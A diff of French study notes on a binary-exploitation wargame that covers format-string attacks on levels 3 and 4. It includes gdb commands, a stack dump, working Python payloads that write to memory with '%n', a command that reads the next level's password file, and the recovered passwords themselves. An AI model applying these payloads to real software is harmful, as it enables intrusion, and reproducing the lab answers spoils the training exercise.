@@ -89,7 +89,7 @@ level2:
 		p/x $eax
 		 |-> 0x804a008
 		 |
-		 `->Nous donne l'address de retour de strdup soit l'emplacement du code dans la heap ''
+		 `-> Nous donne l'address de retour de strdup soit l'emplacement du code dans la heap
 
 	doutes:
 		Je dois verifier que l'addresse de la fonction 'system'
@@ -123,13 +123,16 @@ level2:
 
 level3:
 
-	pdf (Exploiting Format String Vulnerabilities):
+	doc (Exploiting Format String Vulnerabilities):
 		https://cs155.stanford.edu/papers/formatstring-1.2.pdf
 
 	gdb cmd:
 		b *v+59
-		p &m
+		run </dev/null
+		p &m			// addresse de variable 'm'
 		 `-> 0x804988c
+		x $ebp + 4		// addresse de retour fonction avec ca valeur
+		 `-> 0xbffff72c:     0x08048525
 
 	cmd:
 	 |-> python -c "print('%x'*512)" | ./level3
@@ -138,18 +141,17 @@ level3:
 	   200b7fd1ac0b7ff37d025783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425342578347834257825783425257834b7fed280   0bffff76880485258048530   0   0b7e454d3   1bffff804bffff80cb7fdc858   0bffff81cbffff80c   08048258b7fd0ff4   0   0   082099a00b54e5e10   0   0   0   180483f0   0b7ff26b0b7e453e9b7ffeff4   180483f0   08048411804851a   1bffff804
 	
 	observation:
+		L'addresse de la variable 'm' est 0x804988c
 		La memoire peut etre modifiee avec '%n', cet operateur inscrit une valeur entiere comprenant le nombre de caracteres precedement affiche par printf.
 	
 	strategie:
-		Trouver une addresse suffisament proche de l'adresse de la variable 'm' pour ensuite pouvoir la modifier avec l'operateur '%n' en `64`.
+		Definir l'adresse de la variable 'm' dans la stack puis lire cette derniere a l'aide de '%x' pour ensuite pouvoir modifier la valeur 'm' en `64` grace a l'operateur '%n'.
 
+	solution:
+		(python -c "print('\x8c\x98\x04\x08' + 'E'*(64 - 23) + '%x'*3 + '%n')"; echo 'cat /home/user/level4/.pass') | ./level3
 
-	cmd pour skip suffisament d'octets et %n est sur l'addresse de retour de la fonction <v>
-		python -c "print('ABCD' + '%8x'*135)" | ./level3
-
-	
-
-
+	pass:
+		b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 
 /*
 	Pour linear regression
@@ -157,3 +159,32 @@ level3:
 	km_mid = (km_max - km_min) / 2
 	km = (km - km_min - km_mid) / km_mid
 */
+
+
+level4:
+
+	outils:
+		https://hex-works.com/
+
+	observations:
+		Code similaire au level3 excepte que la fonction printf est encapsule dans une autre fonction et la valeur de passage est '16930116' soit '01025544' en hexadecimal.
+		Etant donne que la valeur a injecter est tres grande nous ne pouvons pas ecrire celle si en une seul chaine simple, 16930116 carateres etant plus grand que le buffer.
+
+	strategie:
+		Changer la memoire en plusieurs parties pour que la chaine de carateres necessaire soit repartie sur les differents octets.
+		Dans notre cas en 3 parties: AD+0 AD+1 AD+2 FIL1 %N FIL2 %N FIL3 %N
+
+	tentative:
+		python -c "print('\x8c\x98\x04\x08' + 'E'*(64 - 23) + '%x'*3 + '%n')" | ./level4
+
+	solution:
+		python -c "print('\x10\x98\x04\x08' + '\x11\x98\x04\x08'+ '\x12\x98\x04\x08' + '%46.c' + '%c'*10 + '%n' + 'H'*17 + '%n' + 'T'*173 + '%n')" | ./level4
+
+	pass:
+		0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
+level5:
+
+	
+
+	
